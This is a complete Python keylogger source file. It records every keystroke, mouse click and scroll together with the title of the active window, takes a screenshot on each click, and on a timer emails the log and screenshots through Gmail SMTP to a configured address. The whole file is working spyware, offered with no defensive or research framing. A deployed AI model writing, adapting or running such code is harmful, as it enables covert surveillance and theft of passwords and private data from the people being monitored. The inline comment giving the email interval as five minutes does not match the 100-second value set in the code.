import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard, mouse
from pynput.keyboard import Key
from datetime import datetime
import pyautogui
import os
import pygetwindow as gw
import threading
import time

# Configuration
LOG_FILE = "activity_log.txt"
SCREENSHOT_DIR = "screenshots"
EMAIL_INTERVAL = 100  # seconds (5 minutes)
SENDER_EMAIL = "YourEmailHere@gmail.com"
RECEIVER_EMAIL = "YourEmailHere@gmail.com"
EMAIL_PASSWORD = "YourPassword Ex:(vdycyzarpuwsnewd)"

# Setup
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
screenshot_files = []
email_timer = None
running = True

# Utility Functions
def get_active_window():
    try:
        win = gw.getActiveWindow()
        return win.title if win else "Unknown Window"
    except Exception as e:
        return f"Error getting window: {e}"

def write_log(event):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    active_window = get_active_window()
    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} - [{active_window}] - {event}\n")

def capture_screenshot(event_type):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(SCREENSHOT_DIR, f"{event_type}_{timestamp}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    screenshot_files.append(filename)
    print(f"📸 Screenshot saved: {filename}")

def send_log_email(subject="Activity Log and Screenshots"):
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText("Attached are the logs and screenshots.", 'plain'))

        # Attach log
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={LOG_FILE}")
                msg.attach(part)

        # Attach screenshots
        for shot in screenshot_files:
            if os.path.exists(shot):
                with open(shot, "rb") as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(shot)}")
                    msg.attach(part)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(SENDER_EMAIL, EMAIL_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())

        print(" Email sent successfully.")
        screenshot_files.clear()

    except Exception as e:
        print(f"Failed to send email: {e}")

def schedule_email():
    global email_timer
    if running:
        send_log_email("Scheduled Keylogger Report")
        email_timer = threading.Timer(EMAIL_INTERVAL, schedule_email)
        email_timer.start()

# Event Handlers
def on_key_press(key):
    try:
        write_log(f"Key Pressed: {key.char}")
    except AttributeError:
        write_log(f"Special Key Pressed: {key}")

def on_key_release(key):
    global running
    write_log(f"Key Released: {key}")
    if key == Key.esc:
        running = False
        return False

def on_click(x, y, button, pressed):
    if pressed:
        write_log(f"Mouse Click at ({x}, {y}) with {button}")
        capture_screenshot("click")
    else:
        write_log(f"Mouse Released at ({x}, {y}) with {button}")

def on_scroll(x, y, dx, dy):
    write_log(f"Mouse Scrolled at ({x}, {y}) - Scroll ({dx}, {dy})")

# Main
def start_keylogger():
    global email_timer
    write_log("Keylogger started.")
    schedule_email()

    try:
        with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as k_listener, \
             mouse.Listener(on_click=on_click, on_scroll=on_scroll) as m_listener:
            k_listener.join()
            m_listener.join()
    finally:
        if email_timer:
            email_timer.cancel()
        send_log_email("Final Report - Keylogger Closed")
        print("Keylogger stopped. Final email sent.")

if __name__ == "__main__":
    start_keylogger()
